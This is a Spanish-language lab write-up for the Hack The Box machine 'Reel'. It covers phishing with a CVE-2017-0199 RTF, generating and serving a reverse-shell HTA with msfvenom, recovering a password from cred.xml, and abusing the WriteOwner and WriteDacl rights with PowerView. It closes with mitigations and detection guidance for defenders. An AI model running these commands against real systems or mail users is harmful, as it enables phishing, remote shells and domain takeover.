---
machine: Reel
os: Windows
difficulty: Hard
platform: Hack The Box
category: Windows / Active Directory
state: Retired
tags: [windows, active-directory, smtp, phishing, rtf, cve-2017-0199, acl, writedacl]
---

# Reel — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired según HTB y writeups públicos; no comprobado con sesión en HTB.
> Ficha de método: sin flags ni credenciales reales.

## TL;DR

Host `REEL.HTB.LOCAL` del dominio `HTB.LOCAL`. El FTP anónimo publica documentación interna y un `readme.txt` que pide procedimientos RTF por correo. Se envía un RTF con **CVE-2017-0199** a `nico@megabank.com`, que ejecuta un HTA y devuelve una shell. En el escritorio de `nico` hay un `cred.xml` con la contraseña de `tom`; `tom` tiene `WriteOwner` sobre `claire`; `claire` tiene `WriteDacl` sobre `Backup_Admins`; el grupo llega al script de backup con la contraseña de Administrator.

## Reconocimiento

```bash
nmap -p- -T4 -Pn -oA nmap_all <IP>
nmap -p21,22,25,135,139,445,593,49159 -sCV -Pn -oA nmap_svc <IP>
```

```text
21/tcp   ftp        Microsoft ftpd (anónimo)
22/tcp   ssh        OpenSSH 7.6
25/tcp   smtp       Microsoft ESMTP
135/tcp  msrpc
139/tcp  netbios-ssn
445/tcp  microsoft-ds
593/tcp  ncacn_http
```

Los escaneos antiguos y modernos no coinciden en los puertos RPC altos; el núcleo estable es FTP, SSH, SMTP y SMB. El dominio es `HTB.LOCAL`; el host se anuncia como `REEL`.

```bash
printf '%s\n' '<IP> reel.htb.local HTB.LOCAL REEL' | sudo tee -a /etc/hosts
```

## Enumeración

```bash
ftp -n <IP>
# anonymous / anonymous
ls
get readme.txt
get AppLocker.docx
get 'Windows Event Forwarding.docx'
```

El FTP anónimo entrega tres documentos. `readme.txt` explica que el equipo acepta procedimientos de conversión de documentos y pide enviarlos por correo a `nico@megabank.com`. Es una invitación directa a un cliente de correo vulnerable.

```bash
swaks --to nico@megabank.com --from ryan@test.com \
  --server <IP> --header 'Subject: RTF conversion' \
  --attach click.rtf
```

## Foothold

### RTF + CVE-2017-0199

CVE-2017-0199 permite que un documento RTF cargue un objeto remoto y ejecute un HTA sin la protección habitual de Office. Se genera el HTA y el RTF:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 \
  -f hta-psh -o shell.hta
python2 cve-2017-0199_toolkit.py -M gen -t RTF \
  -w click.rtf -u http://<LHOST>/shell.hta -x 0
```

Se sirve `shell.hta` por HTTP, se escucha el puerto 443 y se envía `click.rtf` por SMTP. Al abrirlo, `nico` ejecuta el HTA y se obtiene una shell como `HTB\nico`.

Variante con Metasploit: `exploit/windows/fileformat/office_word_hta` genera el documento y `exploit/multi/handler` recibe la sesión. La elección de herramienta no cambia el vector.

### De nico a tom

En el escritorio de `nico` hay un `cred.xml` exportado con `Export-Clixml`:

```powershell
$cred = Import-CliXml -Path C:\Users\nico\Desktop\cred.xml
$cred.GetNetworkCredential().Password
```

Devuelve la contraseña de `tom` (`<PASS_TOM>`). Con ella se entra por SSH:

```bash
ssh tom@reel.htb.local
```

La flag de usuario está en el perfil de `tom`.

## Escalada de privilegios

### Tom → Claire: WriteOwner

`tom` tiene **WriteOwner** sobre `claire`. Se toma la propiedad, se concede `ResetPassword` y se cambia la contraseña:

```powershell
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
$pass = ConvertTo-SecureString '<PASS_CLAIRE>' -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $pass
```

Ahora se puede autenticar como `claire` por SSH o WinRM (si el grupo correspondiente lo permite).

### Claire → Backup_Admins: WriteDacl

`claire` tiene **WriteDacl** sobre el grupo `Backup_Admins`. Se concede `WriteMembers` y se añade a Claire:

```powershell
Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' \
  -PrincipalIdentity claire -Rights WriteMembers
Add-DomainGroupMember -Identity 'Backup_Admins' -Members claire
```

`net group backup_admins claire /add` es la variante sin PowerView que aparece en otros writeups; el derecho subyacente es el mismo.

### Backup_Admins → Administrator

El grupo tiene acceso al directorio de Administrator y a los scripts de backup. En uno de ellos aparece la contraseña de Administrator en claro (`<PASS_ADMIN>`). Con SSH:

```bash
ssh administrator@reel.htb.local
```

```text
whoami
htb\administrator
```

La flag de root tiene una entrada de denegación para `Backup_Admins`; por eso el grupo no basta para leerla y hace falta la cuenta de Administrator. Es un detalle importante: el camino termina en una credencial de backup, no en un DCSync.

## Evidencia

- `nmap` con FTP/SSH/SMTP/SMB.
- `readme.txt` y los documentos del FTP anónimo.
- RTF generado y correo enviado, con la IP de callback redactada.
- Shell como `HTB\nico` y `cred.xml` leído con `Import-CliXml`.
- ACL de `tom` sobre `claire` y de `claire` sobre `Backup_Admins`.
- Script de backup con la contraseña de Administrator, redactada.
- `whoami` como `htb\administrator`, sin flags.

## Lecciones aprendidas

- El FTP anónimo no solo filtra documentos: describe el proceso de negocio y el destinatario del phishing.
- CVE-2017-0199 es un fallo de **resolución de objetos remotos**, no de macros; el RTF es el vehículo.
- `cred.xml` no está cifrado con una clave del sistema: `Import-CliXml` bajo la misma cuenta recupera la contraseña.
- `WriteOwner` y `WriteDacl` son derechos distintos: el primero permite cambiar el propietario y luego los permisos; el segundo permite reescribir la ACL directamente.
- El grupo `Backup_Admins` no lee la flag de root por una denegación explícita; el objetivo es la credencial de Administrator.

## Mitigaciones y detección

- Bloquear adjuntos RTF y objetos remotos en el correo; parchear Office (CVE-2017-0199) y deshabilitar la ejecución de HTA desde ubicaciones no confiables.
- Restringir el FTP anónimo y no publicar procedimientos internos con destinatarios y flujos de trabajo.
- Auditar ACLs: `WriteOwner`/`WriteDacl` sobre usuarios y grupos son privilegios de escalada; revisar con BloodHound.
- No guardar credenciales en `cred.xml` ni contraseñas en scripts de backup; usar gMSA o un gestor de secretos.
- Detección: 5136 sobre `nTSecurityDescriptor`; 4728/4732/4756 por altas inesperadas; 4662 con `WriteDACL`; correos con RTF/HTA; ejecución de `mshta.exe` desde un archivo de usuario.
- MITRE: T1566.001, T1203, T1552.001, T1222.001, T1098, T1078.002.

## Referencias

- <https://0xdf.gitlab.io/2018/11/10/htb-reel.html>
- <https://axcheron.github.io/writeups/htb/reel>
- <https://www.hackthebox.com/machines/reel>
